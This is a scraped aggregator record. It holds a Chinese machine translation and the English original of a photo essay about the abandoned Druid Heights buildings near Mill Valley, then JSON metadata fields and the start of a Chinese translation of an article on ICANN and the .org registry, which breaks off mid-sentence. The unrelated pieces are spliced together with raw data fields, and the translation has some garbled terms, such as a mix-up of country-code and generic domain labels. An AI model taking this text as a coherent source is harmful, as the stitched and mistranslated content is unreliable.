Gidlow，1898-1986)的正规教育在她十几岁的时候就结束了。但到了1954年，当她为5英亩的土地和加利福尼亚州磨坊谷外的一些建筑开出首付支票时。她的天赋、勤奋的工作习惯和大胆使她走得很远。\n她靠当记者谋生，并通过诗歌来表达自己，最著名的是她1923年出版的“灰线上”(On A Grey Thread)一书，这是美国作家发表的第一首公开的女同性恋诗歌。她在20世纪20年代初曾在纽约和巴黎生活过，到了那个十年末，她在旧金山站稳了脚跟。在她生命的最后，她的自传“艾尔莎：我带着我的歌来了”成为第一本美国女同性恋者的长篇自传。\n在加州，她与当时许多最重要的作家和艺术家成了朋友。她搬进了她来这里叫德鲁伊高地的新家后不久，这些朋友中的许多人，以及来自四面八方的新朋友，都成了常客。\n罗杰·萨默斯(1926-2001)是一位富有远见的建设者和工匠，他工作努力，聚会也同样努力或更努力。作为一名有天赋的业余音乐家，他所在的德鲁伊高地很快就成了他结交的许多专业音乐家的圣地。这些人不仅是当地的夜总会球员，他们也是全国和国际知名的音乐家，他们的名字至今仍然家喻户晓。罗杰还有很多朋友都是艺术家和作家，他们也来拜访和聚会。\n罗杰·萨默斯负责设计和建造德鲁伊高地最具特色的建筑，并将一些以前的业主改建成如此不同的建筑，以至于在某些情况下几乎认不出来。1965年，他作为一名建筑工人的能力吸引了年轻的埃德·斯泰尔斯来到德鲁伊高地。多年来，艾德，一位才华横溢的家具制造商和建筑商，也为德鲁伊高地的建筑做出了许多重要贡献。作为一个自己做过一些建筑和木工工作的人，罗杰和埃德在德鲁伊高地的工作，一旦我了解到，最初是最吸引人的。\n在对德鲁伊高地产生兴趣几个月后，我联系了我高中时代的一位老朋友，我认为他可能知道怎么去那里，这是正确的。在秋天一个阳光明媚的工作日早晨，我徒步旅行，到达了德鲁伊高地。我在那里花了几个小时尽我所能地检查空置的建筑物，幸运的是我拍了很多照片。然而，令我惊讶的是，我发现空荡荡的建筑没有锁上，有些建筑的状况非常糟糕，进入里面似乎不安全。尽管如此，我还是发现了足够多的东西来观看和拍照。\n除了破旧的建筑，德鲁伊高地的一部分过去是，现在仍然居住着那些在他们曾经拥有的房屋和土地上有生命租约的人。他们的区域贴着“禁止擅自闯入”的牌子，我离他们远远的。\n在3个月后的一次回访中，我计划拍更多的照片。但我原本希望做的事情已经不再可能，因为所有空置的建筑现在都贴上了国家公园管理局(National Park Service)的“危险：请勿进入”的牌子。国家公园管理局是拥有整个德鲁伊高地的政府机构。\n在我第一次访问后的几个月里，我继续尽可能多地了解德鲁伊高地。我学得越多，就越觉得德鲁伊高地应该作为一个独特的国家历史遗迹保存下来。自20世纪50年代中期以来，德鲁伊高地独特的建筑庇护了如此多的作家、艺术家、音乐家和精神思想家。在我一生中参观了许多历史遗迹后，我开始相信德鲁伊高地的遗址和故事非常值得加入他们的行列，如果它丢失了，损失将是悲惨的。\n由于所有的建筑现在都是禁区，我决定分享一下我在秋天拍摄的照片中发现的东西，并附上一些说明文字。一年多后，我现在对历史有了更多的了解，但我会保持简短的描述，让图片来说话。我希望在看完我在那次参观中看到的东西后，你也会觉得德鲁伊高地是一个值得拯救的历史遗迹！\n下面是一张6英亩德鲁伊高地遗址的粗略地图，这是我和其他人在2017年夏天成立拯救德鲁伊高地小组后发给我的。它将帮助您了解总体布局。原版对德鲁伊高地的位置有一些线索，但它们已经被熄灭了。\n我是其中之一的拯救德鲁伊高地组织不支持未经授权访问德鲁伊高地，我们也不会给出方向。在这个时候，去那里是不利的，而不是为了保护。成为保护的支持者，加入拯救德鲁伊高地Facebook小组，了解更多信息，并及时了解拯救这个独特地方的最新努力。\n我参观德鲁伊高地的日期是2016年11月16日。一次偶然的机会，我选择了德鲁伊高地历史上一个重要的日子到来：艾伦·瓦茨逝世43周年纪念日(1915-1973)。\n我当时没有地图，对布局也不太了解。有人告诉我，有些地区仍然有人居住，我应该避开那些地区。徒步到达时，我遇到了另外两个人，一男一女，他们在艾伦去世周年纪念日在他的图书馆举行了一场仪式冥想。我原本打算先去那里，但在得知他们的计划后，我决定把它作为我的最后一站。我告诉他们我的意图，他们感谢我。\n他们说我应该沿着这条路走下去，一定不要错过他们所说的“龙屋”，后来我才知道它也为其他人所知，包括对它今天的样子负有最大责任的人，已故的罗杰·萨默斯(Roger Somers)，也就是双峰楼。在上面的地图上，它被称为牧场之家，因为它是该房产早期作为小宅基地或农场的原始建筑。\n离开图书馆区域，我走向我认为我会找到德鲁伊高地联合创始人埃尔萨·吉洛(Elsa Gidlow)的房子。有人告诉我龙屋就在它的正对面。\n我沿着土路走去，去艾尔莎家的路出现在我的左边。因为它的陡峭，车道是铺设的，这是我在德鲁伊高地唯一看到沥青的地方。\n当我走到车道顶端时，我看到右手边有一座小楼。在地图上，这是一个小的红色正方形，靠近Gidlow House的红色矩形。在德鲁伊高地的政府报告中，它被称为冥想小屋，但我被告知它也被称为女神小屋。如上所述，德鲁伊高地的几座建筑不止一个名字。\n我从来没有见过瓦片边缘切成这样的图案，所以我不得不仔细看一看。\n走到另一边，我发现了这扇漂亮的小平面窗户，可以直接看到另一边的景色。\n离开冥想小屋，我朝前面左手边的一座小房子走去。起初很难真正了解它，因为周围都是灌木丛和树木。我很确定那一定是艾尔莎·吉德洛的房子。\n它显然比我早些时候透过灌木丛和冥想小屋看到的图书馆更古老。后来我了解到，这是1943年为这处房产的前所有者阿尔方斯和塞尔玛·哈帕的女儿建造的。它只有大约800平方英尺，所以很多人可能会称它为小屋，而不是房子。但是，虽然它的体积小，设计简单，但它似乎建造得很好，而且是建立在完全混凝土的周边基础上的。\n下一步，我向西驶向那一边可能腐烂的无法修理的甲板。隐藏在它附近的树叶和杂草下面的是一个混凝土庭院。\n在房子的另一端，有证据表明千钧一发：一棵树倒下了，差一点就撞到了几英尺。\n在那棵树刚刚错过吉洛屋的左边是一扇向卧室望去的大观景窗。在这里，我第一次看到了非常传统的室内设计。\n现在我朝房子的前门走去。我不得不说，当我发现它没有锁的时候，我相当震惊。既然如此，没有任何迹象表明我不能这么做，我就进去了。\n一进门，我就向左转，发现自己在厨房里。水槽似乎是旧的一体式预制件的一部分。当我拍这张照片的时候，我身后是一些橱柜，后来我得知是罗杰在埃尔莎搬进来后不久建造的。\n对于这么小的房子来说，起居室相当宽敞。壁炉做工精良，看起来像是1943年房子建成时的样子。左边现在空着的书架似乎是后来增加的，我后来才知道是这样。和厨房橱柜一样，埃尔莎搬进来后不久，罗杰就建造了这些橱柜，用来存放埃尔莎的藏书。我参观的那天，嵌入式沙发上有几本书，但它们看起来像是最近来的客人留下的。\n现在是时候找到图书馆里的人所说的“龙屋”了，或者是地图上所说的“牧场之家”。穿过树丛中的灌木丛，我看到了前方高耸在我头顶上的一个非常不同寻常的屋顶的轮廓。\n当我走近时，我看到了一扇相当奇怪的窗户。玻璃是方形的，但就在它的后面似乎是一堵有一个大圆孔的墙。从圆形开口的侧面伸出的是薄板，似乎形成了两个架子。\n沿着双峰、龙屋或牧场屋的西侧漫步(随便你挑！)。在寻找一条入口时，我发现自己走在一条砖石小路上，上面有一些非常不寻常的设计。\n如果你看着悲伤的腐烂甲板的左侧，你可以认出上一张照片中显示的路径。后来我了解到，这里看到的较低的“矛”支撑着一种紫藤藤，直到几年前。如果你放大这张照片，就可以看到支撑它们的链条一直延伸到墙上。幸运的是，这座房子的屋顶悬挑相当宽，只要屋顶完好无损，这一特征确实有助于保护建筑免受水破坏。\n由于艾尔莎·吉德洛的房子已经开放，双子峰似乎也有可能开放。在检查之前，我向东走去，以便更好地看一看。从另一边看这是不可能的，因为有这么多的灌木丛。除了能更好地看到独特的屋顶线外，我还注意到在屋顶上使用不同颜色的沥青瓦片制作了一个非常不寻常的图案。在我59年的时间里，无论是在书上还是在网上，我都看过很多不同寻常的房子，但我记得从来没有见过像双峰屋顶这样的房子。\n这是一个特写镜头。我很高兴我刚买了一台像样的新尼康相机！我并不认为自己是一个很好的摄影师，但这有助于弥补我的缺点。\n现在我回到了双峰酒店。很明显，我不应该试图接近那些似乎进入起居室的门，因为我需要走过腐烂的甲板才能做到这一点。东侧看起来好像还有其他的门。为了接近他们，我发现自己走在另一段非常不寻常的小路上。\n现在在我的左边有一扇不同寻常的窗户，看起来厨房就在里面。这是不寻常的，因为屋顶的支撑物在哪里？拐角处不是应该有一根柱子吗？屋顶是如何支撑的仍是个谜…。\n沿着这条小路再走下去，我正朝你上面看到的方向走去。我不得不说，在这一点上，我的下巴感觉它像是挂在相当低的…。..多好的地方啊，我还没进去呢！\n我不确定我前面看到的是什么，但看起来右边是一扇半开的门，门上有一个凹陷的黄色面板，形状像一把吉他。在走向它的路上，左边看到的开口似乎是进入了一个储藏区，但考虑到细节的注意，它肯定不是用来放置普通物体……的。我走过去，把门完全打开。\n这就是我所看到的景色。我走进浴室，第一次瞥见了德鲁伊高地联合创始人罗杰·萨默斯(Roger Somers)标志性的室内橱柜。请注意，中间的凹室有一面枢转镜。后来，我从他的儿子泰戈尔那里了解到，双峰别墅的大部分改建工作在1962年左右完成。\n如果你想知道为什么里面这么亮，这里的答案是：一个非常大的天窗。\n当我再往里走的时候，我发现了水槽和马桶，还有更多建在储藏室里的东西。\nMedium.com似乎无法处理垂直纵横比照片。或者至少我不能让它们工作。在大多数情况下，将它们修剪到接近正方形是没有问题的。但是在这里它不起作用，因为会损失太多，所以我把它一分为二。我拍了这张照片，上一张照片中的水槽和厕所在我的右边，回头看着我进来的门，也在房间的另一端的右边。不要错过远端的瓷砖淋浴，凹陷的天花板灯板，然后是两幅图像中较低部分前景中地板上的木板。\n我低头看着地板上的两块木板，看到了铰链。很好奇，我弯下腰，掀开了边缘。在木板下面，我发现了双峰住宅浴室的另一个令人惊讶的特点：地板上嵌着一个老式的浴缸。\n我应该用闪光灯的，但直到太晚了，才意识到这一点，意思是回家。马桶就在左边，上面照片中可以看到的抽屉显示马桶和水槽在右边，我们正在看厨房。请注意石板地板上的图案与小路外面的图案非常相似。双峰大厦一半以上的楼层都是石板。\n往前走，我发现自己站在厨房窗户的另一边。天花板看起来很低，的确如此。在柜台之间的中心位置较高。天花板上似乎全是隐藏在玻璃纤维板后面的灯具。后来我被告知是这样的。\n我准备离开厨房，我转过身去，透过一个有一扇凹进的滑门的开口，向看起来像是客厅的角落里有一个柴炉。\n离开厨房向右转，我从房间中央看到了这幅景色。后来我了解到，垮掉的一代诗人加里·斯奈德(Gary Snyder)在50年代末帮助罗杰将1926年简单的哈帕“牧场房子”改建成你在这里看到的样子，然后在60年代末在里面住了一年多。而这只是这座房子里倒下的历史的“冰山一角”。下沉桌外面的推拉门可以把它与远处的房间隔开。仔细看看右边，你会看到一条很窄的走廊通向一个小后面的房间。不幸的是，我没有拍下那个房间的照片。房间很朴素，但通向它的大厅不是…。。。\n与此同时，我转身向左转。还记得我们从厨房看到的那个柴炉吗？就在它的左边，墙上安装着一块竖琴般的音板。它可以弹奏，也可以弹奏。或者通过扔碎石来引起共鸣，罗杰·萨默斯的儿子泰戈尔说，他的父亲在聚会中做了几次，以引起人们的注意。\n这就是那条走廊。我不得不把这张照片夹起来，让它合身，我必须躺在地板上才能拍到。右边是一幅手绘壁画，展示了德鲁伊高地的桉树，天花板上更多的是罗杰定制的凹灯。\n检查完那个狭窄的大厅和尽头的房间后，我回到起居室，穿过敞开的书架门，进入了一个完全用书架镶板的房间。为了让它们更耐用，罗杰用玻璃纤维板代替了宣纸。现在我正从外面看清楚我早先看到的那扇圆窗。\n这扇窗户里面和周围的木制品很简单，但效果简直令人惊叹。\n从圆窗往外看，我转到左边，看到墙上的壁纸被推到一边，露出黑暗角落里的一个壁橱。里面有东西，但我没想到要带手电筒。我确实有相机闪光灯，所以我拍了一张照片，这就是照片显示的情况。还记得我们见过的所有凹进的灯吗？还有很多是我们没有的。\n后来有人告诉我，在50年代末或60年代初，你不能开车去家得宝(Home Depot)，或者在米尔谷古德曼(Mill Valley Goodman)的建筑供应部(Building Supply)买一盒调光开关，如果这是你想要的效果的话。罗杰要么是自己建造的，要么是自己建造的，这是所有双峰住宅灯光的定制控制面板。\n现在我准备离开双峰别墅了。嗯，实际上我真的不是，但是我觉得我应该这样做。接下来的几张照片是在双峰或牧场之家和上面地图上所谓的费耶之家之间的空地上拍摄的。我会尽我所能地添加描述，但我过去和现在对接下来的几张图片中的内容的了解仍然非常有限。\n仍然有景观的残留物，比如这些像蝴蝶花一样的花。几种植物完全反季节开花，好像是春天。后来我被告知，这在经历了大量夏季雾的地区并不少见。秋天来了，下了一场小雨，随着云量的整体减少，他们认为是春天了。\n一辆旧的，可能是20世纪90年代的奥迪轿车，贴着2005年的贴纸。后来我了解到，上一次有人住在现在空置的建筑里是在2006年左右。我猜这个被遗弃了…。。。\n在离奥迪轿车不远的地方，有一个地方看起来曾经是一个用栅栏围起来的花园，我猜那里有蔬菜。\n..", "note_en": "I gathered a selection of my photographs and wrote what follows with this goal in mind: to make you feel the same fascination for an amazing place, Druid Heights, that I did after my visit there on November 16, 2016. For all of you, and especialy those viewing on your phone, there are 70 photos coming up mixed in with my decriptive text, once you (hopefully!) read through the intro. Enjoy! To learn more about this special place and its history go to the Save Druid Heights Facebook group page\n 8/29/18 Update: I have put several briefer stories about Druid Heights online since this first one. This is the most complete view. The others can be found by searching Medium using Druid Heights or my name, Michael Toivonen , as your search term.\n This is how it began for me: One day in early 2016, by mere chance, I recalled a long forgotten name, Druid Heights. It had been 40 years since I first heard it while at high school in nearby Mill Valley, California in the 1970’s. Beyond the name all I knew at that time was that a writer on eastern religion that I had been reading, Alan Watts, was living there when he died and that a woman named Elsa Gidlow who was, maybe, a poet, still lived there. I had been intrigued but I had never learned more.\n When that unusual place name popped into my head one rainy day 40 years later I had my laptop ready to launch a query. I found some newspaper articles and some images. It seemed there was quite a bit more to Druid Heights than what I had vaguely imagined….\n By the time of my visit there I had learned that the two principle founders, Elsa Gidlow and Roger Somers, were both creative and productive people whose magnetic personalities were of very different yet quite complimentary sorts, especially in their mutual ability to attract a broad range of significant cultural figures to Druid Heights. Even though Druid Heights physically covers a relatively small area, the two principle founders personality differences meant that there were simultaneously two very different social circles operating there, which served to increase its significance.\n Yorkshire, UK born and Quebec, Canada raised Elsa GIdlow’s (1898–1986) formal education had ended when she was a teenager. But by 1954 when she wrote the check for the down payment on 5 acres and some buildings outside Mill Valley, CA. her natural gifts, hard working habits and audacity had taken her far.\n She earned earned her living as a journalist and had expressed herself through poetry, most notably her 1923 volume “On a Grey Thread”, the first openly lesbian poetry published by an American writer. She had lived in New York and Paris during the early roaring ’20s and had established herself in San Francisco by the end of that decade. And by the end of her life her autobiography, “Elsa: I Come with My Songs” became the first full length autobiography of an American lesbian.\n In California she had become friends with many of the most significant writers and artists of the time. Soon after she moved into her new home at the place she came to call Druid Heights many of those friends, and new ones from near and far, became frequent visitors.\n Roger Somers’ (1926–2001) was a visionary builder and craftsman who worked hard and partied just as hard or harder. A gifted amateur musician, his portion of Druid Heights soon became a mecca for the many professional musicians whom he befriended. These were not just local night club players, they were nationally and internationally known musicians whose names are still household words today. Roger also had many friends who were artists and writers and they too came to visit, and to party.\n Roger Somers was responsible for the design and construction of the most distinctive buildings at Druid Heights and the alteration of some of the prior owner’s into buildings so different as to be in some cases nearly unrecognizable. His abilities as a builder attracted the younger Ed Stiles to Druid Heights in 1965. Over the years Ed, a talented furniture maker and builder, also made a number of significant contributions to the architecture at Druid Heights. As a person who has done a bit of building and woodworking myself it was the work of Roger and Ed at Druid Heights that, once I learned of it, was initially the strongest draw.\n A few months after taking an interest in Druid Heights I contacted an old friend from my high school days who I thought, correctly, might know how to get there. On a sunny weekday morning in the fall I took a hike and arrived at Druid Heights. I spent a few hours there examining the unoccupied buildings as best I could, and luckily I took a lot of photographs. While, to my surprise, I found that the empty buildings weren’t locked some were in such bad shape that entering them did not seem safe. Still, I found more than enough to look at and photograph.\n Besides the buildings in bad shape part of Druid Heights was and is still inhabited by people who have life leases on the homes and land they once owned. Their areas are posted with “No Trespassing” signs and I stayed away from them.\n On a return visit 3 months later I planned to take more photographs. But what I had hoped to do was no longer possible because all the unoccupied buildings were now posted with “Danger: Do Not Enter” signs by the National Park Service, the government agency that owns all of Druid Heights.\n In the months following my initial visit I continued trying to learn as much about Druid Heights as I could. And the more I learned the more I came to feel that Druid Heights should be preserved as a unique national historic site. The distinctive buildings of Druid Heights had sheltered so many writers, artists, musicians and spiritual thinkers from the mid 1950s on. Having visited many historic sites over my life I came to believe that the Druid Heights site and story was quite worthy of joining their ranks, and that if it was lost, the loss would be tragic.\n Since all the buildings are now off limits I decided to share a glimpse of what I found using the photos I took that fall day, along with some explanatory text. I know a lot more about the history now, over a year later, but I am going to keep the descriptions brief and let the pictures do the talking. I hope that after looking at what I saw on that visit you too are left with the feeling that Druid Heights is a historic site worth saving!\n Below is a rough map of the 6 acre Druid Heights site that I was sent after I and others formed the Save Druid Heights group in the summer of 2017. It will help you understand the general layout. The original had some clues to the location of Druid Heights and they have been blacked out.\n The Save Druid Heights group that I am a co-founder of does not support unauthorised visits to Druid Heights and we won’t give out directions. At this time going there works against, not for preservation. Become a supporter of preservation, and join the Save Druid Heights Facebook group to learn more and keep up to date on efforts to save this unique place.\n  The date of my visit to Druid Heights was November 16, 2016. By chance I picked a significant date in Druid Heights history to arrive: the 43rd anniversary of the death of Alan Watts (1915–1973).\n I had no map then and didn’t know much about the layout. I had been told that there were areas that were still inhabited and that I should avoid those. On arriving on foot I met two others, a man and woman, who were there to perform a ritual meditation in Alan’s Library on the anniversary of his passing. I had originally intended to go there first but on learning of their plans I decided to make it my last stop. I told the them of intentions and they thanked me.\n They said I should head on up the road and be sure not to miss what they called “The Dragon House”, which I later learned was also known to others, including the man most responsible for how it looks today, the late Roger Somers, as the Twin peaks House. On the map above it is called the Ranch House since it was the original building from the property’s early days as a small homestead or farm.\n Leaving the area of the library I headed towards where I thought I would find the house of Druid Heights co-founder Elsa Gidlow. I had been told that the Dragon House was just beyond it.\n  I walked up the dirt road and the drive to Elsa’s appeared on my left. Because of it’s steepness the driveway was paved, the only place where I saw asphalt in Druid Heights.\n As I came to the top of the drive I saw this small building on my right. On the map this appears as a small red square near the red rectangle of the Gidlow House. In government reports on Druid Heights it is called the meditation hut but I have been told that it was also called the Goddess cabin. As alluded to above, more than one name is the case with several of the buildings at Druid Heights.\n  I had never seen shingle edges cut into a pattern like this before, so I had to take a closer look\n  Walking around to the other side I found this beautiful faceted window with a straight through to the other side view.\n  Leaving the Meditation hut I headed towards a small house ahead on my left. It was hard to really get a sense of it at first because of all the shrubbery and trees surrounding it. I was pretty sure that it had to be Elsa Gidlow’s house.\n It was obviously older than what I could see of the library that I had viewed through the bushes earlier as well as the meditation hut. I later learned that is was built in 1943 for the one of the daughters of the prior owners of the property, Alfons and Selma Haapa. It is only around 800 square feet, so many might call it a cottage, not a house. But while small in size and simple in design it appeared to be well built and on a full concrete perimeter foundation.\n  Next I headed west towards the likely rotten beyond repair deck on the that side. Hidden beneath the leaves and weeds near it is a concrete patio.\n  At the other end of the house there was evidence of a very close call: a tree had fallen and just missed it by a couple of feet.\n  To the left of where the tree had just missed the Gidlow house was a large picture window looking into a bedroom. Here I was greeted with my first view of the very conventional interior.\n  Now I headed towards the front door of the house. I have to say I was rather shocked to find it unlocked. That being the case, and there then being no signs against doing so, I went in.\n  Once inside I turned to the left and found myself in the kitchen. The sink appeared to be part of an old one piece prefabricated unit. Behind me when I took this photo were some cabinets that I later learned Roger had built soon after Elsa moved in.\n  The living room was very fairly spacious for such a small house. The fireplace was well crafted, and looked to be from when the house was built in 1943. The now empty book shelves on the left appeared to be a somewhat later addition which I later learned was the case. Like the kitchen cabinets Roger had built them to house Elsa’s collection of books soon after she moved in. The day I of my visit there were a couple of books on the built-in sofa but they looked to have been left by recent visitors.\n  Now it was time to find the “Dragon House” as the people at the library had called it, or the Ranch House as it is called on the map. Walking through brush growing between trees I saw the profile of a very unusual roof towering above me up ahead.\n  As I got closer I saw a rather strange window. The glass was square but immediately behind it was what appeared to be a wall with a large circular opening. Jutting out from the sides of the circular opening were thin boards that seemed to form a couple of shelves.\n   Walking along the west side of the Twin Peaks, Dragon or Ranch house (take your pick!) looking for an entry I found myself on a masonry path with some very unusual designs in it.\n  If you look on the left side of the sadly decaying deck you can make out the pathway shown in the previous photo. I learned later that the lower “spears” seen here supported a wisteria vine until a few years ago. If you enlarge the photo the chains running back to the wall that help support them become visible. Luckily this house has a fairly wide roof overhang, a feature which really helps preserve a building from water damage as long as the roof is intact.\n  Since Elsa Gidlow’s house had been open it seemed possible the Twin Peaks would be too. Before checking that out I walked away towards the east to get a better look at it. That hadn’t been possible from the other side because of all the brush. Besides getting a better view of the distinctive roof line, I noticed a very unusual pattern made by using different colors of asphalt shingles on the roof. I have looked at many an unusual house over my 59 years both in person, in books and online but I don’t recall ever seeing anything like the Twin Peaks house roof.\n  Here is a closeup. I am sure glad I had just bought a decent new Nikon point and shoot camera! I do not conside myself much of a photographer but it helped make up for my short comings.\n  Now I went back towards the Twin Peaks House. It was obvious that I should not try to approach the doors that appeared to go into what was likely the living room because I would need to walk over the rotten deck to do so. It looked like there were other doors long the east side. To get to them I found myslf walking on another stretch of very unusual path way.\n  Now on my left was an unusual window and it looked like the kitchen was inside. It was unusual because where was the support for the roof? Shouldn’t there be a post at the corner? How the roof is supported there is still a mystery…\n  Walking further down the path I was moving towards what you see above. I have to say that by this point my lower jaw felt like it was hanging pretty low…..what a place, and I hadn&#39;t even gone in!\n I wasn’t sure what I was seeing ahead of me, but it did appear that on the right was a partly open door with a recessed yellow panel shaped like a guitar. On the way towards it the opening seen to the left appeared to have been into a storage area, but given the attention to detail it must not have been for ordinary objects……I headed past it and fully opened the door.\n  This is the view that greeted me. I had entered the bathroom room and was getting my first glimpse of some of Druid Heights co-founder Roger Somers’ signature interior cabinetry. Note that the middle alcove has a pivoting mirror. I later learned from his son Tagore that the majority of the remodel of the Twin Peaks house was completed by around 1962.\n  If you wondered why it was so bright inside here is the answer: a very large skylight.\n  As I went further in I found the sink and toilet and more built in storage.\n   Medium.com does not seem to be able to handle vertical aspect photos. Or at least I could not make them work. In most cases cropping them close to square is no problem. But here it doesn’t work because too much would be lost, so I split it in half. I took this photo with the sink and toilet in the previous image on my right looking back towards the door I came in through also on the right at the far end of the room. Don’t miss the tiled shower at the far end, the recessed ceiling light panels and then the boards on the floor in the foreground of the lower of the two images.\n  Looking down at the two boards on the floor I saw hinges. Quite curious, I reached down and lifting the edge. Under the boards I found another surprising feature of the Twin Peaks house bathroom: an old fashioned tub set into the floor.\n  I should have used the flash on this one but didn’t realize that until too late, meaning back home. The toilet is just is on the left, the drawers visible in the photo above showing the toilet and sink are on the right and we are looking into the kitchen. Notice how the pattern in the slate floor is much like that outside in the pathway. More than half the floors in the Twin Peaks house are slate.\n  Moving forward I found myself on the other side of that kitchen window. The ceiling looks low, and it is. It is higher over the center between the counters. The ceiling appears to be full of hidden light fixtures behind fiberglass panels. I was later told that it is.\n   I was ready to leave the kitchen, and I turned to look through an opening with a recessed sliding door towards what looked like the living room with a woodstove in the corner.\n  Leaving the kitchen and turning to my right I was greeted with this view from the middle of the room. I was to later learn that Beat Generation poet Gary Snyder helped Roger in the late ’50s on the remodel of the simple 1926 Haapa “Ranch house” into what you see here and then lived in it for over a year in the late ’60s. And that is just the “tip of the iceberg” of history that went down in this house. The sliding doors beyond the sunken table can close it off from the room beyond. Take a close look on the right and you will see a very narrow hall way heading off to a small back room. I did not, unfortunately, take photos of that room. The room was pretty plain, but the hall leading to it was not…..\n  Meanwhile, I turned around to my left. Remember the woodstove we saw from the kitchen? Just to the left of it the harp-like sound board of a piano is mounted in the wall. It can be strummed or plucked. Or made to resonate by throwing gravel at it which Roger Somers’ son Tagore says his father did a few times in the midst of parties to get people’s attention.\n  Here is that hallway. I had to clip this shot to make it fit, and I had to lie on the floor to take it. On the right is a hand painted mural show casing the Eucalyptus of Druid Heights and on the ceiling are more of Roger’s custom recessed lights.\n  After checking out that narrow hall and the room at its end I went back into the living room and through the open shoji doors into a room completely paneled with shoji. To make them more durable Roger used fiberglass panels instead of rice paper. Now I was getting a good look at the round window I had seen earlier from outside.\n  The woodwork around in and around this window is simple, but the effect is simply amazing.\n  Turning to my left after looking out the round window I saw that the wall shoji were slid aside revealing a closet in a dark corner. Something was inside there but I had not thought to bring a flashlight. I did have the camera flash so I took a photo and this is what it revealed. Remember all the recessed lights we have seen? And there are also many we haven’t.\n I was later told that in the late ‘50s/early ’60s you could not drive over to Home Depot, or in those days in Mill Valley Goodman’s Building Supply, and buy a box of dimmer switches if that was the effect you wanted. Roger either built himself or had built this is custom control panel for all the Twin Peaks house lights.\n Now I was ready to leave the Twin Peaks House. Well actually I really wasn’t but I felt that I should. The next several photos are taken in the open areas between the Twin Peaks or Ranch House and what is called Faye’s House on the map above. I will add descriptions to the extent I can, but my knowledge was and still is very limited about what is in the next few images.\n  There are still surviving remnants of the landscaping, like these Iris-like flowers. Several plants were in bloom completely out of season, as if it were spring. I was later told that this is not uncommon in areas that experience a lot of summer fog. Fall comes, and after a little rain and with overall decreased cloud cover they think it is spring.\n      An old, probably 1990s, Audi sedan with 2005 stickers. I subsequently learned that the last time anyone lived in any of the now unoccupied buildings was around 2006. I guess this got abandoned…..\n  Not far from the Audi sedan there is an area that looked to have once been a fenced in garden, I will guess for vegetables.\n......", "posttime": "2020-05-12 11:37:18", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "德鲁伊,druid", "title": "漫步德鲁伊高地(2018)", "title_en": "A Walk Through Druid Heights (2018)", "transed": 1, "url": "https://medium.com/@savedruidheights/a-first-visit-to-druid-heights-5956d613110c", "via": "", "real_tags": ["德鲁伊", "druid"]}, {"category": "", "categoryclass": "", "imagename": "bdc8e68f9989ee82b6065cf3a81e7d5d.jpg", "infoid": 1001755, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "如果你在关注科技新闻，你可能已经看到ICANN拒绝同意公共利益注册局控制权变更的声明，这对.org有一些影响。然而，除非你在棒球内部关注大量的DNS，否则可能不太清楚这一切意味着什么。这篇文章的目的是对这里的背景和.org发生的事情做一个高水平的概述。此外，Mozilla一直在积极参与关于这个话题的公开讨论；请看这里作为一个很好的起点。\n您可能已经注意到，网站有“mozilla.org”、“google.com”等名称，这些名称称为“域名”。这一切的运作方式是有许多“顶级域名”(.org，.com，.io，…)。然后，人们可以在这些域名中获得名字(即，以其中一个域名结尾的域名)。顶级域(TLD)有两种主要类型：\n国家代码顶级域(CcTLD)，代表某个国家或地区，如.US(美国)、.uk(英国等)。\n与某个国家或地区不对应的通用顶级域(GTLD)，如.com、.org等。\n回到互联网之初，有五个通用顶级域名，旨在大致反映注册名称的实体的类型：\n重要的是要记住，直到90年代，大部分互联网都运行在可接受的使用政策下，该政策不鼓励/禁止商业使用，因此这些区别本质上有点模糊，但尽管如此，人们仍然大致理解.org是针对非营利组织的，.com是针对公司的。\n在此期间，实际的域名注册是由一系列政府承包商处理的(先是SRI，然后是网络解决方案)，但顶级域名的创建和分配是在互联网号码分配机构(IANA)的控制下进行的，实际上，这主要是由其主任Jon Postel决定的。然而，随着互联网变得越来越大，这变得越来越站不住脚，特别是在IANA是根据与美国政府的合同运营的情况下。通过一系列漫长而有些复杂的事件，1998年，这一责任移交给互联网名称与数字地址分配机构(ICANN)，该机构管理整个系统，包括制定总体规则和确定将存在哪些通用顶级域名(存在哪些通用顶级域名由ISO 3166-1国家代码确定，如RFC 1591所述)。ICANN已经创建了一堆新的gTLD，比如.dev、.biz和.wtf(您可能想知道世界是否真的需要.wtf，但它确实存在)。顺便说一句，你看到的许多新注册的名字实际上并不在通用顶级域名之下，而是恰好与幸运地拥有听起来很酷的国家代码的国家相对应的通用顶级域名。例如，.io实际上是英属印度洋的TLD，.tv属于图瓦卢。\nICANN做的另一件事是确定谁来运行每个TLD。这一切的工作方式是，ICANN确定谁将成为注册表，即，谁保存谁拥有哪个名字的记录，以及实际路由名称查找所需的一些技术数据。注册域名的实际工作是由与客户打交道的注册商完成的。重要的是，虽然注册商在一定程度上竞争业务(即，多个人可以在.com中向您出售一个域名)，但对于给定的TLD，只有一个注册机构，因此他们在该TLD内不存在任何价格竞争；如果您想要.com域名，VeriSign可以设置价格下限。此外，ICANN并不真的试图压低价格；事实上，他们最近取消了.org域名的价格上限(使其与大多数其他TLD保持一致)。关于这些合同的一个有趣事实是，它们实际上是永久的：合同本身期限相当长，登记处协议通常规定自动续签，但登记处行为严重不当的情况除外。换句话说，这或多或少是对给定TLD的收入的永久索赔。\n这里的底线是，这一切都是相当有利可图的。例如，VeriSign在19财年的收入超过12亿美元。ICANN本身主要通过两种方式赚钱。首先，它从每个域名注册的收入中提成，其次，如果有超过一个实体想要注册新的通用顶级域名，它会拍卖新的通用顶级域名的合同。在截至2018年6月的财年中，ICANN的总收入为1.36亿美元(前一年为3.02亿美元，原因是来自gTLD拍卖的大量收入)。\n这就把我们带到了ISOC和.org的故事上。直到2003年，VeriSign一直运营.com、.net和.org，但ICANN和VeriSign同意放弃运营.org(同时保留利润高得多的.com)。正如他们的提案中所说的那样：\n一般而言，它将在很大程度上消除基于VeriSign在ICANN成立之前的遗留活动而对其进行特殊或独特待遇的残余，并通常将VeriSign与ICANN置于与所有其他通用TLD注册运营商相同的关系中。此外，它还将把.org注册恢复到最初的目的，分开.com和.net注册的合同到期日，并总体上承诺VeriSign支付其公平份额的ICANN费用，对这一责任没有任何人为或特殊的限制。\n互联网协会(ISOC)是一个非营利性组织，其使命是支持和促进“互联网作为全球技术基础设施、丰富人们生活的资源和社会公益力量的发展”。2002年，他们提交了11个接管.org注册的提案中的一个，ICANN最终选择了他们。ICANN列出了11项入选标准，董事会会议纪要对选择ISOC的原因相当含糊